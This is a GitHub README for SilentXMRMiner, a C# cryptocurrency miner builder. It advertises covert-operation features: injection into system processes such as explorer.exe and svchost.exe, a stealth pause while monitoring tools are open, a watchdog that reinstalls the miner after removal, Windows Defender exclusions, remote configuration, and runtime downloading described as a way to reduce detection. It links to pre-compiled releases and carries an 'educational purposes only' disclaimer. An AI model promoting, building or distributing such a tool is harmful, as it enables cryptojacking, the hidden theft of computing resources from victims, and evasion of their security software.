
<img src="https://github.com/UnamSanctam/SilentXMRMiner/blob/master/SilentXMRMiner.png?raw=true">

# SilentXMRMiner v1.4.4 - Based on Lime Miner v0.3

Can mine all the following algorithms and thus all the cryptocurrencies that use them:
<details>
 <summary>List of algorithms</summary>
 <table>
	<tr><th>Algorithm</th><th>Example Cryptocurrency</th></tr>
	<tr><td>rx/0</td><td>Monero</td></tr>
	<tr><td>argon2/chukwa</td><td>2ACoin</td></tr>
	<tr><td>rx/arq</td><td>ArQmA</td></tr>
	<tr><td>cn-heavy/xhv</td><td>Haven, Blockcloud</td></tr>
	<tr><td>cn/ccx</td><td>Conceal</td></tr>
	<tr><td>astrobwt</td><td>Dero</td></tr>
	<tr><td>cn/fast</td><td>Electronero, ElectroneroXP</td></tr>
	<tr><td>cn/rwz</td><td>Graft</td></tr>
	<tr><td>rx/keva</td><td>Kevacoin</td></tr>
	<tr><td>cn-pico</td><td>Kryptokrona</td></tr>
	<tr><td>cn/half</td><td>Masari</td></tr>
	<tr><td>argon2/ninja</td><td>NinjaCoin</td></tr>
	<tr><td>kawpow</td><td>Ravencoin</td></tr>
	<tr><td>rx/sfx</td><td>Safex</td></tr>
	<tr><td>cn/r</td><td>Sumokoin</td></tr>
	<tr><td>cn-pico/tlo</td><td>Talleo</td></tr>
	<tr><td>argon2/chukwav2</td><td>Turtlecoin</td></tr>
	<tr><td>cn/upx2</td><td>Uplexa</td></tr>
	<tr><td>rx/wow</td><td>Wownero</td></tr>
	<tr><td>cn/zls</td><td></td></tr>
	<tr><td>cn/double</td><td></td></tr>
	<tr><td>cn/2</td><td></td></tr>
	<tr><td>cn/xao</td><td></td></tr>
	<tr><td>cn/rto</td><td></td></tr>
	<tr><td>cn-heavy/tube</td><td></td></tr>
	<tr><td>cn-heavy/0</td><td></td></tr>
	<tr><td>cn/1</td><td></td></tr>
	<tr><td>cn-lite/1</td><td></td></tr>
	<tr><td>cn-lite/0</td><td></td></tr>
	<tr><td>cn/0</td><td></td></tr>
</table>

</details>

## Main Features

* .NET - Coded in C#, requires .NET Framework 4.5
* Injection (Silent/Hidden) - Hide payload behind another process like explorer.exe, conhost.exe, svchost.exe or some other process
* CPU & GPU Mining - Can mine on Both CPU and GPU (Nvidia & AMD)
* Idle Mining - Can be configured to mine at different usages or not at all while computer is or isn't in use
* Stealth - Pauses the miner and clears the GPU memory while any of the programs in the "Stealth Targets" option are open
* Watchdog - Replaces the miner file if removed and starts it if the injected miner is closed down
* Remote Configuration - Can get the miner settings remotely from a URL every 100 minutes
* Bypass Windows Defender - Adds exclusions into Windows Defender for the general folders the miner uses
* Online Downloader - Can download the miner binary during runtime to greatly decrease file size and detections

## Downloads

Pre-Compiled: https://github.com/UnamSanctam/SilentXMRMiner/releases

## My Other Miners

[Silent ETH (Ethereum) Miner](https://github.com/UnamSanctam/SilentETHMiner)

## Wiki

You can find the new wiki [here](https://github.com/UnamSanctam/SilentXMRMiner/wiki) or at the top of the page.

## Changelog

### v1.4.4 (07/08/2021)
* **Any old miner using "Online Download" will automatically get this update for any new clients**
* Now gets the Remote Configuration every 100 minutes
* Added failover capability for the Remote Configuration URL, add several URLs by separating them by a comma (,)
* Changed the Remote Configuration scheme from INI to JSON, can still read INI files for backwards compatibility
* Added capabilities to change more miner settings with Remote Configuration
* Migrated from {%COMPUTERNAME%}, {%USERNAME%} and {%RANDOM%} to {COMPUTERNAME}, {USERNAME} and {RANDOM} but the old ones will still work for backwards compatibility
* Now replaces {COMPUTERNAME}, {USERNAME} and {RANDOM} with their respective values when using Remote Configuration
* Fixed possible Idle activation crash on Windows 7
* Added the Stealth Targets option which allows you to enter which programs the Stealth option should pause for
* Added algorithm selection to make it easier to use
* Fixed the GPU detection for systems that have custom lowercase characters like Turkish, seems like I failed the "Turkey Test" again
* Fixed broken builder help tooltips
* Major miner update/rework
* Improved miner stability

[You can view the full Changelog here](CHANGELOG.md)

## Author

* **Unam Sanctam**
* Credit to **NYAN CAT** 

## Disclaimer

I, the creator, am not responsible for any actions, and or damages, caused by this software.

You bear the full responsibility of your actions and acknowledge that this software was created for educational purposes only.

This software's main purpose is NOT to be used maliciously, or on any system that you do not own, or have the right to use.

By using this software, you automatically agree to the above.

## License

This project is licensed under the MIT License - see the [LICENSE](/LICENSE) file for details

## Donate

XMR: 8BbApiMBHsPVKkLEP4rVbST6CnSb3LW2gXygngCi5MGiBuwAFh6bFEzT3UTufiCehFK7fNvAjs5Tv6BKYa6w8hwaSjnsg2N

BTC: bc1q26uwkzv6rgsxqnlapkj908l68vl0j753r46wvq

ETH: 0x40E5bB6C61871776f062d296707Ab7B7aEfFe1Cd

RVN: RFsUdiQJ31Zr1pKZmJ3fXqH6Gomtjd2cQe

LINK: 0x40E5bB6C61871776f062d296707Ab7B7aEfFe1Cd

ETC: 0xd513e80ECc106A1BA7Fa15F1C590Ef3c4cd16CF3

DOGE: DNgFYHnZBVLw9FMdRYTQ7vD4X9w3AsWFRv

LTC: Lbr8RLB7wSaDSQtg8VEgfdqKoxqPq5Lkn3